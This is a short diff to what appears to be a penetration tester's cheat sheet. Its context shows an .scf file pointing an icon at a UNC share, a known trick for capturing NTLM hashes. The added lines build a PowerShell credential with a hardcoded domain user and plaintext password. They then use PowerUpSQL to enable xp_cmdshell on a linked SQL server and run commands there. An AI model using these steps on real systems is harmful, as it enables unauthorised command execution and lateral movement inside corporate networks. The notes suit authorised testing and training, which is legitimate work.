@@ -679,3 +679,16 @@ IconFile=\\10.10.14.12\share\pentestlab.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
+
+[ps credential]
+$username = 'CORP.local\cleark'
+$password = convertto-securestring -Force -AsPlainText "P@$$w0rd!"
+$cred = New-Object System.Management.Automation.PSCredential -ArgumentList($username,$password)
+
+[powerupsql]
+# cheatsheet
+https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
+# enable xp_cmdshell
+Get-SQLQuery -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "m3sqlw.m3c.local"'
+# execute command
+Get-SQLQuery -Query 'EXECUTE(''xp_cmdshell ''''whoami'''''') AT "m3sqlw.m3c.local"'
